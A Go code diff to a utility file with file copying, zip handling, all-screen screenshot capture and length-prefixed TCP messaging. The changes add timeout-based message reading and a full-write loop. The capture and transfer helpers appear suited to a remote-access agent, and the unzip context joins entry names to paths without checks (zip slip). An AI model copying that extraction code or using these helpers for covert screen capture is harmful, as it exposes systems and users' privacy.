@@ -13,11 +13,11 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"time"
 
 	"github.com/kbinani/screenshot"
 )
 
-/// FS
 
 func CopyFile(src, dst string, info fs.FileInfo) error {
 	source, err := os.Open(src)
@@ -90,7 +90,6 @@ func CopyDir(srcDir, dstDir string) error {
 	return nil
 }
 
-/// ZIP
 
 func ZipBytes(data []byte, name string) ([]byte, error) {
 	var buf bytes.Buffer
@@ -191,7 +190,6 @@ func UnzipFile(zipPath string, targetDir string) error {
 	for _, f := range r.File {
 		destPath := filepath.Join(targetDir, f.Name)
 
-		// Создание директорий
 		if f.FileInfo().IsDir() {
 			err = os.MkdirAll(destPath, os.ModePerm)
 			if err != nil {
@@ -324,7 +322,6 @@ func UnzipDirectory(zipData []byte, targetDir string) error {
 	return nil
 }
 
-/// SCREENS
 
 func Screenshots() (map[int][]byte, error) {
 	result := make(map[int][]byte)
@@ -344,7 +341,6 @@ func Screenshots() (map[int][]byte, error) {
 	return result, nil
 }
 
-/// NET
 
 func ConnRead(conn net.Conn, size int) ([]byte, error) {
 	if size <= 0 {
@@ -382,6 +378,84 @@ func RecvMsg(conn net.Conn) ([]byte, error) {
 	return ConnRead(conn, int(msgLen))
 }
 
+const recvMsgMaxPayload = 32 << 20
+
+var ErrRecvMsgPollTimeout = errors.New("recvmsg poll timeout")
+
+func readPrefix4Poll(conn net.Conn, idle time.Duration) (uint32, error) {
+	hdr := make([]byte, 4)
+	for n := 0; n < 4; {
+		conn.SetReadDeadline(time.Now().Add(idle))
+		nr, err := conn.Read(hdr[n:])
+		n += nr
+		if n >= 4 {
+			break
+		}
+		if err != nil {
+			if ne, ok := err.(net.Error); ok && ne.Timeout() && n == 0 {
+				return 0, ErrRecvMsgPollTimeout
+			}
+			if ne, ok := err.(net.Error); ok && ne.Timeout() && n > 0 {
+				continue
+			}
+			return 0, err
+		}
+	}
+	conn.SetReadDeadline(time.Time{})
+	return binary.BigEndian.Uint32(hdr), nil
+}
+
+func readFullIdle(conn net.Conn, buf []byte, idle time.Duration) error {
+	for n := 0; n < len(buf); {
+		conn.SetReadDeadline(time.Now().Add(idle))
+		nr, err := conn.Read(buf[n:])
+		n += nr
+		if n >= len(buf) {
+			break
+		}
+		if err != nil {
+			if nr > 0 {
+				continue
+			}
+			return err
+		}
+	}
+	conn.SetReadDeadline(time.Time{})
+	return nil
+}
+
+func RecvMsgPoll(conn net.Conn, idle time.Duration) ([]byte, error) {
+	msgLen32, err := readPrefix4Poll(conn, idle)
+	if err != nil {
+		return nil, err
+	}
+	if msgLen32 == 0 {
+		return nil, fmt.Errorf("recvmsg: zero length message")
+	}
+	if msgLen32 > recvMsgMaxPayload {
+		return nil, fmt.Errorf("recvmsg: message too large")
+	}
+	buf := make([]byte, msgLen32)
+	if err := readFullIdle(conn, buf, 60*time.Second); err != nil {
+		return nil, err
+	}
+	return buf, nil
+}
+
+func WriteFull(conn net.Conn, b []byte) error {
+	if conn == nil {
+		return errors.New("conn is nil")
+	}
+	for n := 0; n < len(b); {
+		nw, err := conn.Write(b[n:])
+		n += nw
+		if err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
 func SendMsg(conn net.Conn, data []byte) error {
 	if conn == nil {
 		return errors.New("conn is nil")
@@ -390,6 +464,5 @@ func SendMsg(conn net.Conn, data []byte) error {
 	msgLen := make([]byte, 4)
 	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
 	message := append(msgLen, data...)
-	_, err := conn.Write(message)
-	return err
+	return WriteFull(conn, message)
 }
